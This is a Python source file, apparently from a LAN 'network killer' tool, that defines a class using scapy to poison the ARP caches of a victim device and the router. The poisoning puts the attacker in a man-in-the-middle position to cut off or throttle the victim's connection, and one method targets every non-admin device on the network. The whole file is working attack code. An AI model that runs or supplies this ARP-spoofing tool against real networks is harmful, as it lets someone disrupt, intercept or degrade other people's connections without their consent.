from scapy.all import ARP, send, Ether, sendp
from time import sleep
import logging

from tools.utils import threaded, get_default_iface
from constants import *
from networking.limiter import SimpleBandwidthLimiter

logger = logging.getLogger(__name__)

class Killer:
    def __init__(self, router=DUMMY_ROUTER):
        self.iface = get_default_iface()
        self.router = router
        self.killed = {}
        self.storage = {}
        self.my_mac = None  # Store our MAC to avoid self-pollution
        self.bandwidth_limiter = SimpleBandwidthLimiter()  # Bandwidth limiting support
    
    def set_my_mac(self, mac):
        """Set attacker's MAC address to prevent self-targeting"""
        self.my_mac = mac
        logger.info(f'Attacker MAC set to: {mac}')
    
    @threaded
    def kill(self, victim, wait_after=1):
        """
        Spoofing victim with proper MAC isolation
        """
        if victim.mac in self.killed:
            logger.warning(f'{victim.mac} is already killed.')
            return
        
        # Prevent killing our own machine
        if self.my_mac and victim.mac == self.my_mac:
            logger.error('Cannot kill own device!')
            return
        
        self.killed[victim.mac] = victim

        # Create proper ARP packets with explicit source MAC
        # Tell victim that router is at our MAC (MITM position)
        to_victim = ARP(
            op=2,  # ARP reply (op=2 is more reliable than op=1)
            psrc=self.router.ip,
            hwsrc=self.my_mac or self.iface.mac,  # Use our MAC explicitly
            pdst=victim.ip,
            hwdst=victim.mac
        )

        # Tell router that victim is at our MAC (MITM position)
        to_router = ARP(
            op=2,  # ARP reply
            psrc=victim.ip,
            hwsrc=self.my_mac or self.iface.mac,  # Use our MAC explicitly
            pdst=self.router.ip,
            hwdst=self.router.mac
        )

        logger.info(f'Killing {victim.ip} ({victim.mac})')

        while victim.mac in self.killed \
            and self.iface.name != 'NULL':
            # Send packets to both victim and router with explicit targeting
            try:
                send(to_victim, iface=self.iface.name, verbose=0, count=1)
                send(to_router, iface=self.iface.name, verbose=0, count=1)
            except Exception as e:
                logger.error(f'Error sending ARP packets: {e}')
                break
            sleep(wait_after)

        logger.info(f'Unkilled {victim.ip} ({victim.mac})')

    @threaded
    def unkill(self, victim):
        """
        Restore proper ARP entries for victim
        """
        if victim.mac not in self.killed:
            logger.warning(f'{victim.mac} is not in killed list')
            return
            
        self.killed.pop(victim.mac)

        # Restore Victim's ARP cache with correct router MAC
        to_victim = ARP(
            op=2,  # ARP reply
            psrc=self.router.ip,
            hwsrc=self.router.mac,
            pdst=victim.ip,
            hwdst=victim.mac
        )

        # Restore Router's ARP cache with correct victim MAC
        to_router = ARP(
            op=2,  # ARP reply
            psrc=victim.ip,
            hwsrc=victim.mac,
            pdst=self.router.ip,
            hwdst=self.router.mac
        )

        if self.iface.name != 'NULL':
            try:
                # Send restoration packets multiple times for reliability
                send(to_victim, iface=self.iface.name, verbose=0, count=5)
                send(to_router, iface=self.iface.name, verbose=0, count=5)
                logger.info(f'Successfully restored ARP for {victim.ip}')
            except Exception as e:
                logger.error(f'Error restoring ARP: {e}')

    def kill_all(self, device_list):
        """
        Safely kill all devices
        """
        for device in device_list[:]:
            if device.admin:
                continue
            if device.mac not in self.killed:
                self.kill(device)

    def unkill_all(self):
        """
        Safely unkill all devices killed previously
        """
        for mac in dict(self.killed):
            self.killed.pop(mac)
    
    def store(self):
        """
        Save a copy of previously killed devices
        """
        self.storage = dict(self.killed)
    
    def release(self):
        """
        Remove the stored copy of killed devices
        """
        self.storage = {}
    
    def rekill_stored(self, new_devices):
        """
        Re-kill old devices in self.storage
        """
        for mac, old in self.storage.items():
            for new in new_devices:
                # Update old killed with newer ip
                if old.mac == new.mac:
                    old.ip = new.ip
                    break
                
            # Update new_devices with those it does not have
            if old not in new_devices:
                new_devices.append(old)

            self.kill(old)
    
    def limit_bandwidth(self, victim, download_kbps=None, upload_kbps=None):
        """
        Apply bandwidth limits to a device (auto-kills if needed)
        
        Args:
            victim: Device object
            download_kbps: Download speed limit in KB/s (None = unlimited)
            upload_kbps: Upload speed limit in KB/s (None = unlimited)
        """
        # Auto-kill device if not already killed (for MITM)
        if victim.mac not in self.killed:
            logger.info(f'Auto-killing {victim.ip} for bandwidth limiting')
            self.kill(victim)
            sleep(0.5)  # Brief delay to establish MITM
        
        self.bandwidth_limiter.set_limit(victim.mac, download_kbps, upload_kbps)
        logger.info(f'Bandwidth limits applied to {victim.ip}: DL={download_kbps}KB/s, UL={upload_kbps}KB/s')
        return True
    
    def remove_bandwidth_limit(self, victim):
        """
        Remove bandwidth limits from a device
        """
        self.bandwidth_limiter.remove_limit(victim.mac)
        logger.info(f'Bandwidth limits removed from {victim.ip}')
    
    def get_bandwidth_limits(self):
        """
        Get all current bandwidth limits
        """
        return self.bandwidth_limiter.get_limits()